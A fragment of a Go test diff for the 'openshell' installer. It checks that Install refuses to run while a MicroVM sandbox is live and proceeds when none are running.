+		f.inst.PrepareUpgrade = nil
+		f.inst.Discover = openshell.DiscoverOptions{ConfigDir: t.TempDir()}
+		f.inst.CountMicroVMs = func(context.Context) (int, error) { return 1, nil }
+		if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrSandboxesRunning) || f.ran() ||
+			!strings.Contains(err.Error(), "1 MicroVM run as this account") {
+			t.Fatalf("%s, a MicroVM live: Install = %v (ran %v)", existing, err, f.ran())
+		}
+		f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
+		f.inst.PrepareUpgrade = nil
+		f.inst.Discover = openshell.DiscoverOptions{ConfigDir: t.TempDir()}
+		f.inst.CountMicroVMs = noMicroVMs
+		if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || !f.ran() {
+			t.Fatalf("%s, no MicroVM: Install = %+v, %v", existing, res, err)
 		}
 	}
 }
